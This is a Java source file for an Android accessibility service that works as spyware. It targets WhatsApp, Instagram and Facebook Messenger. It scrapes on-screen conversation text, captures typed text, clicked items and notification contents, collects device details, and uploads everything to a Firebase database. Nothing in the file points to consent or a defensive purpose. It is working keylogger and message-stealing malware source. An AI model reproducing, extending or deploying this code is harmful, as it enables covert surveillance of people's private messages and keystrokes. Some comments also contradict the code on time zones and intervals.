package com;

import android.accessibilityservice.AccessibilityService;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.Notification;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Bundle;

import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Date;
import java.util.Locale;
import java.util.TimeZone;


import java.util.List;
import java.util.LinkedHashMap;
import java.util.Map;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;


public class MyAccessibilityService extends AccessibilityService {

    private static final String TAG = "AppUsageAccessibilityService";
    private static final List<String> TARGET_APP_PACKAGES = Arrays.asList(
            "com.whatsapp.w4b",
            "com.whatsapp",
            "com.instagram.android",
            "com.facebook.orca"
            // Add more as needed - tho it won't work with any app
    );
    private static final long EXPIRATION_TIME = 10 * 60 * 1000; // 10 minutes in milliseconds

    private static final long LOG_INTERVAL = 100; // 0,8 seconds
    private long lastLogTime = 0;

    private String currentText = "";
    private final Map<String, Long> sentTexts = new LinkedHashMap<>();



    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // Process event based on type
        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                handleTextChangedEvent(event);
                break;

            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                handleNotificationChangedEvent(event);
                break;

            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                handleTypeViewEvent(event);
                break;

            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                // Handle window state changes for target apps
                String packageName = String.valueOf(event.getPackageName());
                if (TARGET_APP_PACKAGES.contains(packageName)) {
                    Log.d(TAG, "Target app open: " + packageName);
                    logAllTexts();
                }
                break;

            // Add other event types if needed
        }
    }


    private void logAllTexts() {
        long currentTime = System.currentTimeMillis();

        // Avoid duplicates in a interval
        if (currentTime - lastLogTime < LOG_INTERVAL) {
            Log.d(TAG, "Log skipped due to cool down.");
            return;
        }
        lastLogTime = currentTime; // Update the timestamp of the last log

        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode != null) {
            StringBuilder stringBuilder = new StringBuilder();
            traverseNode(rootNode, stringBuilder);
            String allTexts = stringBuilder.toString();

            // Find the position of "Channels[LINEBREAK][LINEBREAK]Explore"
            int channelsIndex = allTexts.indexOf("Channels[LINEBREAK][LINEBREAK]Explore");

            // If found, truncate the text at that point
            if (channelsIndex != -1) {
                allTexts = allTexts.substring(0, channelsIndex);
                Log.d(TAG, "Truncated text at WhatsApp Channels section");
            }

            Log.d(TAG, "Texts displayed on the screen: \n " + allTexts);

            long expirationTime = System.currentTimeMillis();
            sentTexts.entrySet().removeIf(entry -> expirationTime - entry.getValue() > EXPIRATION_TIME);

            if (!allTexts.isEmpty() && !sentTexts.containsKey(allTexts)) {
                sentTexts.put(allTexts, expirationTime);
                sendLogsToFirebase(allTexts);
            } else {
                Log.d(TAG, "Duplicated or empty logs avoided.");
            }
        }
    }

    private void traverseNode(AccessibilityNodeInfo node, StringBuilder stringBuilder) {
        if (node == null) return;
        if (node.getText() != null) {
            // Store the text with a special marker for line breaks that we can convert to HTML later
            stringBuilder.append(node.getText().toString()).append("[LINEBREAK][LINEBREAK]");
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            traverseNode(node.getChild(i), stringBuilder);
        }
    }

    private void sendLogsToFirebase(String logs) {
        FirebaseDatabase database = FirebaseDatabase.getInstance();
        DatabaseReference myRef = database.getReference("LoggedTexts");
        SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss", Locale.getDefault());
        sdf.setTimeZone(TimeZone.getTimeZone("America/Los_Angeles"));
        String formattedDate = sdf.format(new Date());

        // Escape special HTML characters and prepare for HTML rendering
        String htmlFormattedLogs = escapeHtml(logs);

        // Create a log object
        Map<String, Object> logData = new LinkedHashMap<>();
        logData.put("Date", formattedDate);  // Store UTC-3 formatted date
        logData.put("Texts", htmlFormattedLogs);
        myRef.push().setValue(logData)
                .addOnSuccessListener(aVoid -> Log.d("Firebase", "Logs sent successfully"))
                .addOnFailureListener(e -> Log.e("Firebase", "Failed to send logs", e));
    }

    // Helper method to escape HTML special characters and replace our markers with HTML breaks
    private String escapeHtml(String input) {
        if (input == null) return "";

        // First escape HTML special characters
        String escaped = input
                .replace("&", "&amp;")
                .replace("<", "&lt;")
                .replace(">", "&gt;")
                .replace("\"", "&quot;")
                .replace("'", "&#39;");

        // Then replace our custom line break markers with HTML <br> tags
        return escaped.replace("[LINEBREAK]", "<br>");
    }

    private void handleTextChangedEvent(AccessibilityEvent event) {
        List<CharSequence> textList = event.getText();

        for (CharSequence text : textList) {
            String newText = text.toString();

            if (!newText.equals(currentText)) {
                currentText = newText;
                if (!currentText.isEmpty()) {
                    sendToFirebase("Text Changed", currentText);
                }
            }
        }
    }

    private void sendToFirebase(String eventType, String message) {
        FirebaseDatabase database = FirebaseDatabase.getInstance();
        DatabaseReference myRef = database.getReference("events");

        // Convert timestamp to readable format in UTC-3 (Brasilia Time)
        SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss", Locale.getDefault());
        sdf.setTimeZone(TimeZone.getTimeZone("America/Los_Angeles"));
        String formattedDate = sdf.format(new Date());

        // Create an event object
        Map<String, Object> eventData = new LinkedHashMap<>();
        eventData.put("Date", formattedDate);  // Store UTC-3 formatted date
        eventData.put("Event", eventType);
        eventData.put("Message", message);

        myRef.push().setValue(eventData)
                .addOnSuccessListener(aVoid -> Log.d("Firebase", "Event sent successfully"))
                .addOnFailureListener(e -> Log.e("Firebase", "Failed to send event", e));
    }

    private void handleNotificationChangedEvent(AccessibilityEvent event) {
        StringBuilder notificationTextBuilder = new StringBuilder();
        for (CharSequence text : event.getText()) {
            notificationTextBuilder.append(text);
        }
        CharSequence notificationText = notificationTextBuilder.toString();

        if (!notificationText.toString().isEmpty()) {
            Notification notification = (Notification) event.getParcelableData();
            String title = "", text = "", subText = "", bigText = "";

            if (notification != null) {
                Bundle extras = notification.extras;
                title = extras.getString(Notification.EXTRA_TITLE, "");
                text = extras.getString(Notification.EXTRA_TEXT, "");
                subText = extras.getString(Notification.EXTRA_SUB_TEXT, "");
                bigText = extras.getString(Notification.EXTRA_BIG_TEXT, "");
            }

            String fullNotificationMessage = title + " - " + text +
                    (!subText.isEmpty() ? " - " + subText : "") +
                    (!bigText.isEmpty() ? " - " + bigText : "");

            sendToFirebase("Notification", fullNotificationMessage);
        }
    }

    private void handleTypeViewEvent(AccessibilityEvent event) {
        StringBuilder clickedViewTextBuilder = new StringBuilder();
        for (CharSequence text : event.getText()) {
            clickedViewTextBuilder.append(text);
        }
        String clickedViewText = clickedViewTextBuilder.toString();

        if (!clickedViewText.isEmpty()) {
            sendToFirebase("Clicked", clickedViewText);
        }
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.flags = AccessibilityServiceInfo.DEFAULT;
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        setServiceInfo(info);

        // Check if it's the first run
        SharedPreferences prefs = getSharedPreferences("MyPrefs", Context.MODE_PRIVATE);
        boolean isFirstRun = prefs.getBoolean("FirstRun", true);

        if (isFirstRun) {
            String deviceDetails = getSYSInfo();
            sendToFirebase("DeviceInfo", deviceDetails); // Send to Firebase instead
            SharedPreferences.Editor editor = prefs.edit();
            editor.putBoolean("FirstRun", false);
            editor.apply();
        }
    }

    private String getSYSInfo() {
        return "MANUFACTURER : " + Build.MANUFACTURER + "\n" +
                "MODEL : " + Build.MODEL + "\n" +
                "PRODUCT : " + Build.PRODUCT + "\n" +
                "VERSION.RELEASE : " + Build.VERSION.RELEASE + "\n" +
                "VERSION.INCREMENTAL : " + Build.VERSION.INCREMENTAL + "\n" +
                "VERSION.SDK.NUMBER : " + Build.VERSION.SDK_INT + "\n" +
                "BOARD : " + Build.BOARD + "\n";
    }

    @Override
    public void onInterrupt() {
        //
    }
}


